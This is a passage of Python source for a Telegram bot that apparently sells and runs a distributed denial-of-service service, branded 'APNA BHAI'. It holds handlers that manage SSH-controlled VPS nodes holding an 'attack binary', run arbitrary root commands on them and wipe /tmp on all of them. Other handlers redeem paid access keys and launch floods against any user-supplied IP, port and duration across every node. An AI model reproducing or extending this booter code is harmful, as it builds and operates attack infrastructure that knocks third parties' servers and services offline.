        success, output = ssh_execute(
            ip,
            details['username'],
            details['password'],
            f"rm -f /root/bin/{binary}"
        )
        
        if not success:
            raise Exception(output)
        
        bot.send_message(
            chat_id,
            f"✅ *Binary removed successfully!*\n\n"
            f"🖥️ VPS: `{ip}`\n"
            f"📦 Binary: `{binary}`",
            reply_markup=get_vps_binary_markup(),
            parse_mode='Markdown'
        )
        
    except Exception as e:
        bot.send_message(
            chat_id,
            f"❌ Failed to remove binary!\nError: {str(e)}",
            reply_markup=get_vps_binary_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "🔄 VPS Reset" and is_owner(message.from_user.id))
def vps_reset_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "*You don't have permission to reset VPS!*", parse_mode='Markdown')
        return
    
    # Create confirmation keyboard
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        KeyboardButton("✅ Confirm VPS Reset"),
        KeyboardButton("❌ Cancel Reset"),
        KeyboardButton("⬅️ Back")
    )
    
    bot.send_message(
        chat_id,
        "⚠️ *VPS RESET WARNING* ⚠️\n\n"
        "This will perform the following actions on ALL VPS:\n"
        "1. Stop all running attacks\n"
        "2. Remove all temporary files\n"
        "3. Reinstall attack binaries\n\n"
        "❗ *This cannot be undone!*\n\n"
        "Are you sure you want to proceed?",
        reply_markup=markup,
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_vps_reset_confirmation)

def process_vps_reset_confirmation(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if message.text == "❌ Cancel Reset" or message.text == "⬅️ Back":
        bot.send_message(
            chat_id,
            "🚫 VPS reset cancelled",
            reply_markup=get_vps_markup(),
            parse_mode='Markdown'
        )
        return
    
    if message.text != "✅ Confirm VPS Reset":
        bot.send_message(
            chat_id,
            "❌ Invalid confirmation. Please use the buttons provided.",
            reply_markup=get_vps_markup(),
            parse_mode='Markdown'
        )
        return
    
    # Start the reset process
    bot.send_message(
        chat_id,
        "🔄 Starting VPS reset process... This may take several minutes.",
        parse_mode='Markdown'
    )
    
    vps_data = load_vps_data()
    total_vps = len(vps_data['vps'])
    success_count = 0
    fail_count = 0
    
    for ip, details in vps_data['vps'].items():
        try:
            # 2. Clean up temporary files
            ssh_execute(ip, details['username'], details['password'], "rm -rf /tmp/*")
            
            # 3. Reinstall attack binary (assuming it's called 'smokey')
            ssh_execute(ip, details['username'], details['password'], "rm -f ~/home/master/raja")
            # You would add commands here to reinstall your attack binary
            
            success_count += 1
        except Exception as e:
            logger.error(f"Failed to reset VPS {ip}: {str(e)}")
            fail_count += 1
    
    # Send final report
    bot.send_message(
        chat_id,
        f"✅ *VPS Reset Complete!*\n\n"
        f"Total VPS: {total_vps}\n"
        f"Successful resets: {success_count}\n"
        f"Failed resets: {fail_count}\n\n"
        f"All VPS should now be in a clean state.",
        reply_markup=get_vps_markup(),
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda m: m.text == "💻 Terminal" and is_owner(m.from_user.id))
def handle_terminal_access(message):
    """Entry point for terminal commands"""
    bot.send_message(
        message.chat.id,
        "💻 *VPS Terminal Access*\n\n"
        "Choose a quick command or select 'Run Command' for custom input.\n\n"
        "⚠️ All commands execute as root!",
        reply_markup=get_vps_terminal_markup(),
        parse_mode='Markdown'
    )

# Still maintain the !cmd direct access
@bot.message_handler(func=lambda m: m.text.startswith('!cmd ') and is_owner(m.from_user.id))
def handle_direct_command(message):
    """Direct command execution without menus"""
    chat_id = message.chat.id
    full_cmd = message.text[5:].strip()
    
    if not full_cmd:
        bot.send_message(chat_id, "❌ Format: !cmd <vps_ip> <command>")
        return
    
    parts = full_cmd.split(maxsplit=1)
    if len(parts) < 2:
        bot.send_message(chat_id, "❌ Format: !cmd <vps_ip> <command>")
        return
    
    ip, command = parts
    process_terminal_command(message, ip)  # Reuse the same execution function

@bot.message_handler(func=lambda message: message.text == "⏱️ Bot Uptime" and is_admin(message.from_user.id))
def bot_uptime(message):
    chat_id = message.chat.id
    current_time = time.time()
    uptime_seconds = int(current_time - BOT_START_TIME)
    
    # Convert seconds to days, hours, minutes, seconds
    days = uptime_seconds // (24 * 3600)
    uptime_seconds %= 24 * 3600
    hours = uptime_seconds // 3600
    uptime_seconds %= 3600
    minutes = uptime_seconds // 60
    seconds = uptime_seconds % 60
    
    uptime_str = ""
    if days > 0:
        uptime_str += f"{days}d "
    if hours > 0:
        uptime_str += f"{hours}h "
    if minutes > 0:
        uptime_str += f"{minutes}m "
    uptime_str += f"{seconds}s"
    
    bot.send_message(
        chat_id,
        f"⏱️ *Bot Uptime*\n\n"
        f"🕒 Running for: `{uptime_str}`\n"
        f"📅 Since: `{datetime.fromtimestamp(BOT_START_TIME).strftime('%Y-%m-%d %H:%M:%S')}`",
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "🗑️ Remove VPS" and is_owner(message.from_user.id))
def remove_vps_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "🔒 *You don't have permission to remove VPS!*", parse_mode='Markdown')
        return
    
    vps_data = load_vps_data()
    
    if not vps_data['vps']:
        bot.send_message(chat_id, "❌ *No VPS found to remove!*", parse_mode='Markdown')
        return
    
    # Create fancy numbered list of VPS
    vps_list = list(vps_data['vps'].items())
    response = "✨ *VPS Removal Panel* ✨\n"
    response += "╔════════════════════════════╗\n"
    response += "║  🗑️ *SELECT VPS TO REMOVE*  ║\n"
    response += "╚════════════════════════════╝\n\n"
    response += "🔢 *Available VPS Servers:*\n"
    
    for i, (ip, details) in enumerate(vps_list, 1):
        response += f"\n🔘 *{i}.*  🌐 `{ip}`\n"
        response += f"   👤 User: `{details['username']}`\n"
        response += f"   ⏳ Added: `{datetime.fromisoformat(details['added_at']).strftime('%d %b %Y')}`\n"
    
    # Add cancel option with emoji
    response += "\n\n💡 *Enter the number* (1-{}) *or* ❌ *type '0' to cancel*".format(len(vps_list))
    
    # Send the styled list
    msg = bot.send_message(
        chat_id,
        response,
        parse_mode='Markdown'
    )
    
    # Store the VPS list for next step
    bot.register_next_step_handler(msg, process_vps_removal_by_number, vps_list)

def process_vps_removal_by_number(message, vps_list):
    chat_id = message.chat.id
    user_id = message.from_user.id
    selection = message.text.strip()
    
    try:
        selection_num = int(selection)
        
        # Cancel option
        if selection_num == 0:
            bot.send_message(
                chat_id,
                "🚫 *VPS removal cancelled!*",
                reply_markup=get_vps_markup(),
                parse_mode='Markdown'
            )
            return
            
        # Validate selection
        if selection_num < 1 or selection_num > len(vps_list):
            raise ValueError("Invalid selection")
            
        # Get selected VPS
        selected_ip, selected_details = vps_list[selection_num - 1]
        
        # Create fancy confirmation message
        confirm_msg = (
            f"⚠️ *CONFIRM VPS REMOVAL* ⚠️\n"
            f"┌──────────────────────────────┐\n"
            f"│  🖥️ *VPS #{selection_num} DETAILS*  │\n"
            f"├──────────────────────────────┤\n"
            f"│ 🌐 *IP:* `{selected_ip}`\n"
            f"│ 👤 *User:* `{selected_details['username']}`\n"
            f"│ 📅 *Added:* `{datetime.fromisoformat(selected_details['added_at']).strftime('%d %b %Y %H:%M')}`\n"
            f"└──────────────────────────────┘\n\n"
            f"❗ *This action cannot be undone!*\n\n"
            f"🔴 Type *'CONFIRM'* to proceed\n"
            f"🟢 Type anything else to cancel"
        )
        
        msg = bot.send_message(
            chat_id,
            confirm_msg,
            parse_mode='Markdown'
        )
        
        bot.register_next_step_handler(msg, confirm_vps_removal, selected_ip)
        
    except ValueError:
        bot.send_message(
            chat_id,
            f"❌ *Invalid selection!*\nPlease enter a number between 1-{len(vps_list)} or 0 to cancel.",
            reply_markup=get_vps_markup(),
            parse_mode='Markdown'
        )

def confirm_vps_removal(message, ip_to_remove):
    chat_id = message.chat.id
    user_id = message.from_user.id
    confirmation = message.text.strip().upper()
    
    if confirmation == "CONFIRM":
        vps_data = load_vps_data()
        
        if ip_to_remove in vps_data['vps']:
            del vps_data['vps'][ip_to_remove]
            
            if save_vps_data(vps_data):
                bot.send_message(
                    chat_id,
                    f"✅ *SUCCESS!*\n\n🖥️ VPS `{ip_to_remove}` has been *permanently removed*!",
                    reply_markup=get_vps_markup(),
                    parse_mode='Markdown'
                )
            else:
                bot.send_message(
                    chat_id,
                    f"❌ *FAILED!*\n\nCould not remove VPS `{ip_to_remove}`. Please try again.",
                    reply_markup=get_vps_markup(),
                    parse_mode='Markdown'
                )
        else:
            bot.send_message(
                chat_id,
                f"🤔 *NOT FOUND!*\n\nVPS `{ip_to_remove}` doesn't exist in the system.",
                reply_markup=get_vps_markup(),
                parse_mode='Markdown'
            )
    else:
        bot.send_message(
            chat_id,
            "🟢 *Operation cancelled!*\n\nNo VPS were removed.",
            reply_markup=get_vps_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text.startswith("!approveclaim ") and is_admin(message.from_user.id))
def approve_additional_claim(message):
    try:
        target_user_id = int(message.text.split()[1])
        users = load_users()
        user = next((u for u in users if u['user_id'] == target_user_id), None)
        
        if not user:
            bot.send_message(
                message.chat.id,
                f"❌ User {target_user_id} not found!",
                parse_mode='Markdown'
            )
            return
            
        # Reset their claim status
        user['has_claimed'] = False
        save_users(users)
        
        bot.send_message(
            message.chat.id,
            f"✅ User {target_user_id} can now claim again!",
            parse_mode='Markdown'
        )
        
        # Notify the user if possible
        try:
            bot.send_message(
                target_user_id,
                "🎉 Admin has approved you for another claim!\n\n"
                "You can now use the 🎁 Claim button again.",
                parse_mode='Markdown'
            )
        except:
            pass
            
    except Exception as e:
        bot.send_message(
            message.chat.id,
            f"❌ Error: {str(e)}\n\nUsage: !approveclaim USER_ID",
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "📋 List VPS" and is_owner(message.from_user.id))
def list_vps_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "*You don't have permission to list VPS.*", parse_mode='Markdown')
        return
    
    vps_data = load_vps_data()
    
    if not vps_data['vps']:
        bot.send_message(chat_id, "*No VPS found!*", parse_mode='Markdown')
        return
    
    # Check status for each VPS
    bot.send_message(chat_id, "🔄 Checking VPS statuses... This may take a moment.", parse_mode='Markdown')
    
    vps_status = {}
    for ip, details in vps_data['vps'].items():
        try:
            # Check if VPS is online by executing a simple command
            status, _ = ssh_execute(ip, details['username'], details['password'], "echo 'Connection test'")
            if status:
                # Check if attack binary exists
                binary_status = ssh_execute(ip, details['username'], details['password'], "test -f ~/home/master/raja && echo '1' || echo '0'")[1].strip()
                vps_status[ip] = {
                    'status': "🟢 Online",
                    'binary': "✔ Found" if binary_status == "1" else "✖ Missing"
                }
            else:
                vps_status[ip] = {
                    'status': "🔴 Offline",
                    'binary': "❓ Unknown"
                }
        except Exception as e:
            logger.error(f"Error checking VPS {ip}: {e}")
            vps_status[ip] = {
                'status': "🔴 Offline",
                'binary': "❓ Unknown"
            }
    
    # Prepare the summary
    online_count = sum(1 for ip in vps_status if vps_status[ip]['status'] == "🟢 Online")
    offline_count = len(vps_status) - online_count
    
    response = (
        "╔══════════════════════════╗\n"
        "║     🖥️ VPS STATUS       ║\n"
        "╠══════════════════════════╣\n"
        f"║ Online: {online_count:<15} ║\n"
        f"║ Offline: {offline_count:<14} ║\n"
        f"║ Total: {len(vps_status):<16} ║\n"
        "╚══════════════════════════╝\n\n"
        f"Bot Owner: @{message.from_user.username or 'admin'}\n\n"
    )
    
    # Add details for each VPS with status
    for i, (ip, details) in enumerate(vps_data['vps'].items(), 1):
        status_info = vps_status.get(ip, {'status': '🔴 Unknown', 'binary': '❓ Unknown'})
        
        response += (
            f"╔══════════════════════════╗\n"
            f"║ VPS {i} Status{' '*(16-len(str(i)))}║\n"
            f"╠══════════════════════════╣\n"
            f"║ {status_info['status']:<24} ║\n"
            f"║ IP: {ip:<20} ║\n"
            f"║ User: {details['username']:<18} ║\n"
            f"║ Binary: {status_info['binary']:<17} ║\n"
            f"╚══════════════════════════╝\n\n"
        )
    
    # Send the response with Markdown formatting
    bot.send_message(
        chat_id,
        f"```\n{response}\n```",
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "👑 Owner Tools" and is_owner(message.from_user.id))
def owner_tools(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "*You don't have permission for owner tools.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*Owner Tools*",
        reply_markup=get_owner_markup(),
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "➕ Add Owner" and is_owner(message.from_user.id))
def add_owner_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "*You don't have permission to add owners.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*Send the User ID to add as owner:*",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_owner_addition)

def process_owner_addition(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    new_owner = message.text.strip()
    
    try:
        new_owner_id = int(new_owner)
    except ValueError:
        bot.send_message(chat_id, "*Invalid User ID. Please enter a number.*", parse_mode='Markdown')
        return
    
    owner_data = load_owner_data()
    
    if new_owner_id in owner_data['owners']:
        bot.send_message(
            chat_id,
            f"*User {new_owner_id} is already an owner!*",
            reply_markup=get_owner_markup(),
            parse_mode='Markdown'
        )
        return
    
    owner_data['owners'].append(new_owner_id)
    
    if save_owner_data(owner_data):
        bot.send_message(
            chat_id,
            f"*User {new_owner_id} added as owner successfully!*",
            reply_markup=get_owner_markup(),
            parse_mode='Markdown'
        )
    else:
        bot.send_message(
            chat_id,
            f"*Failed to add owner {new_owner_id}.*",
            reply_markup=get_owner_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "🟢 Bot ON" and is_owner(message.from_user.id))
def bot_on_button(message):
    global BOT_ENABLED
    BOT_ENABLED = True
    bot.send_message(
        message.chat.id,
        "🟢 *Bot is now ON* - All commands are now active.",
        parse_mode='Markdown',
        reply_markup=get_owner_markup()
    )

@bot.message_handler(func=lambda message: message.text == "🔴 Bot OFF" and is_owner(message.from_user.id))
def bot_off_button(message):
    global BOT_ENABLED
    BOT_ENABLED = False
    bot.send_message(
        message.chat.id,
        "🔴 *Bot is now OFF* - All commands will be ignored until bot is turned back on.",
        parse_mode='Markdown',
        reply_markup=get_owner_markup()
    )

@bot.message_handler(func=lambda message: message.text == "⬅️ Back")
def back_command(message):
    user_id = message.from_user.id
    bot.send_message(
        message.chat.id,
        "*Main Menu*",
        reply_markup=get_menu_markup(user_id),  # Changed from get_menu_markup to get_menu_markup
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text.strip().upper().startswith("APNA-BHAI-"))
def handle_key_redemption(message):
    redeem_key(message)

def redeem_key(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    key = message.text.strip().upper()  # Convert to uppercase for consistency
    
    keys = load_keys()
    
    # Check if key exists in the keys dictionary
    if key not in keys:
        bot.send_message(
            chat_id,
            "❌ *Invalid Key!*\n\n"
            "The key you entered is not valid. Please check and try again.\n\n"
            "Contact admin if you believe this is an error.",
            parse_mode='Markdown',
            reply_markup=get_menu_markup(user_id)
        )
        return
    
    if keys[key].get('redeemed', False):
        bot.send_message(
            chat_id,
            "⚠️ *Key Already Redeemed!*\n\n"
            "This key has already been used. Please get a new key from admin.",
            parse_mode='Markdown',
            reply_markup=get_menu_markup(user_id)
        )
        return
    
    # Get key details
    key_type = keys[key]['type']
    duration = keys[key]['duration']
    is_vip = keys[key].get('is_vip', False)
    max_seconds = keys[key].get('max_seconds', REGULAR_MAX_TIME)
    
    # Calculate expiration time based on key type
    if key_type == 'hour':
        expires = datetime.now() + timedelta(hours=duration)
    elif key_type == 'day':
        expires = datetime.now() + timedelta(days=duration)
    elif key_type == '3day':
        expires = datetime.now() + timedelta(days=3)
    elif key_type == 'week':
        expires = datetime.now() + timedelta(weeks=duration)
    elif key_type == '15day':
        expires = datetime.now() + timedelta(days=15)
    elif key_type == '30day':
        expires = datetime.now() + timedelta(days=30)
    else:
        expires = datetime.now()  # Default to now if unknown type
    
    # Update user data
    users = load_users()
    user_exists = any(u['user_id'] == user_id for u in users)
    
    if user_exists:
        # Update existing user
        for user in users:
            if user['user_id'] == user_id:
                user['key'] = key
                user['valid_until'] = expires.isoformat()
                user['is_vip'] = is_vip
                user['max_seconds'] = max_seconds  # Store custom max time
                break
    else:
        # Add new user
        users.append({
            'user_id': user_id,
            'key': key,
            'valid_until': expires.isoformat(),
            'is_vip': is_vip,
            'max_seconds': max_seconds  # Store custom max time
        })
    
    # Mark key as redeemed
    keys[key]['redeemed'] = True
    keys[key]['redeemed_by'] = user_id
    keys[key]['redeemed_at'] = datetime.now().isoformat()
    
    # Save data
    if save_users(users) and save_keys(keys):
        remaining = expires - datetime.now()
        days = remaining.days
        hours = remaining.seconds // 3600
        
        vip_status = "✅ *VIP Status Activated*" if is_vip else "❌ *Regular User*"
        
        bot.send_message(
            chat_id,
            f"╔════════════════════════╗\n"
            f"║     ✅ KEY REDEEMED     ║\n"
            f"╚════════════════════════╝\n\n"
            f"🔑 *Key Type:* {key_type}\n"
            f"{vip_status}\n"
            f"⏱️ *Max Attack Time:* {max_seconds}s\n"
            f"⏳ *Duration:* {days} days, {hours} hours\n"
            f"📅 *Expires:* {expires.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"🚀 *Enjoy your access!*\n\n"
            f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
            f"👑 Powered by APNA BHAI",
            reply_markup=get_menu_markup(user_id),
            parse_mode='Markdown'
        )
    else:
        bot.send_message(
            chat_id,
            "❌ *Error Saving Data!*\n\n"
            "Failed to save your key redemption. Please try again.",
            parse_mode='Markdown',
            reply_markup=get_menu_markup(user_id)
        )
@bot.message_handler(func=lambda message: len(message.text.split()) == 3)
def handle_attack_command(message):
    global active_attacks, last_attack_times, THREADS_PER_VPS, PACKET_SIZE

    user_id = message.from_user.id
    chat_id = message.chat.id

    if not BOT_ENABLED:
        bot.send_message(chat_id, "🔴 *Bot is currently disabled by admin.*", parse_mode='Markdown')
        return

    auth = check_user_authorization(user_id)
    if not auth['authorized']:
        bot.send_message(chat_id, f"🚷 *VIP ACCESS ONLY*\n{auth['message']}", parse_mode='Markdown')
        return

    try:
        target_ip, port_str, duration_str = message.text.split()
        target_port = int(port_str)
        duration = int(duration_str)

        if not validate_ip(target_ip):
            raise ValueError("❌ Invalid IP address.")
        if not (1 <= target_port <= 65535):
            raise ValueError("❌ Port must be between 1 and 65535.")
        if target_port in BLOCKED_PORTS:
            raise ValueError(f"🚫 Port `{target_port}` is restricted by admin.")

        max_time = ADMIN_MAX_TIME if is_admin(user_id) else VIP_MAX_TIME if is_vip(user_id) else REGULAR_MAX_TIME
        if duration > max_time:
            raise ValueError(f"⏱️ Max allowed time: `{max_time}s`")

        vps_list = get_active_vps_list()
        if not vps_list:
            raise ValueError("⚠️ No active VPS nodes available.")

        attack_id = f"{user_id}_{int(time.time())}"
        active_attacks.add(attack_id)
        last_attack_times[user_id] = time.time()

        # Show attack initialization with settings
        bot.send_message(
            chat_id,
            f"🔥 *Attack Initialized*\n\n"
            f"🎯 Target: `{target_ip}:{target_port}`\n"
            f"⏱ Duration: `{duration}s`\n"
            f"💻 VPS Nodes: `{len(vps_list)}`\n"
            f"🧵 Threads/VPS: `{THREADS_PER_VPS}`\n"
            f"📦 Packet Size: `{PACKET_SIZE} bytes`\n"
            f"🚀 Total Power: `{THREADS_PER_VPS * len(vps_list)} threads`\n\n"
            f"🔄 Launching attack across all VPS...",
            parse_mode='Markdown'
        )

        result = execute_distributed_attack(vps_list, target_ip, target_port, duration)

        # Final report with all settings
        bot.send_message(
            chat_id,
            f"✅ *Attack Completed!*\n\n"
            f"🎯 IP: `{target_ip}`\n"
            f"📍 Port: `{target_port}`\n"
            f"⏱ Duration: `{duration}s`\n"
            f"💻 VPS: `{len(vps_list)}`\n"
            f"🧵 Threads/VPS: `{THREADS_PER_VPS}`\n"
            f"📦 Packet Size: `{PACKET_SIZE} bytes`\n"
            f"🚀 Total Power: `{result['total_power']}`\n\n"
            f"🟢 Success: `{result['success']}`\n"
            f"🔴 Failed: `{result['failed']}`\n"
            f"👑 *APNA BHAI POWER*",
            parse_mode='Markdown'
        )

    except ValueError as ve:
        bot.send_message(chat_id, f"⚠️ *Input Error:* {str(ve)}", parse_mode='Markdown')
    except Exception as ex:
        logger.error(f"Unexpected error: {ex}", exc_info=True)
        bot.send_message(chat_id, "🚨 *Unexpected error occurred.*", parse_mode='Markdown')
    finally:
        if 'attack_id' in locals():
            active_attacks.discard(attack_id)

if __name__ == '__main__':
    logger.info("Starting bot...")

    # Load initial data
    keys = load_keys()

    while True:
        try:
            # Add a small delay before starting
            time.sleep(2)

            # Force-stop any existing webhooks
            bot.remove_webhook()
            time.sleep(1)

            # Start polling with safe parameters
            bot.infinity_polling(
                skip_pending=True,           # Ignores pending updates
                timeout=20,                  # Prevents hanging
                long_polling_timeout=10      # Shorter timeout
            )

        except Exception as e:
            logger.error(f"Bot crashed with error: {e}")
            import traceback
            traceback.print_exc()
            logger.info("Restarting bot in 5 seconds...")
            time.sleep(5)

        finally:
            logger.info("Bot shutdown cleanup...")
            try:
                bot.remove_webhook()
            except Exception as cleanup_error:
                logger.warning(f"Cleanup webhook removal failed: {cleanup_error}")


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------